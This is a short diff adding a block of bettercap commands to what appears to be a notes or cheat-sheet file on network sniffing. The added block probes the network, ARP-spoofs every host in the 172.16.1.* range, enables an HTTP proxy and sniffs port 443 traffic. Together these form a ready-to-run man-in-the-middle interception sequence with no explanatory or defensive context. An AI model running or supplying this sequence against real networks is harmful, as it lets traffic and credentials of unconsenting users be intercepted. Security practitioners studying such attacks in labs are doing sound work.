@@ -37,6 +37,19 @@ set net.sniff.local true
 set net.sniff.filter tcp port 443
 net.sniff on
 ```
+```
+net.probe on
+sleep 1
+net.probe off
+set net.sniff.verbose false
+set arp.spoof.targets 172.16.1.*
+set net.sniff.local true
+set net.sniff.verbose false
+set net.sniff.filter tcp port 443
+arp.spoof on
+http.proxy on
+net.sniff on
+```
 
 set target
 
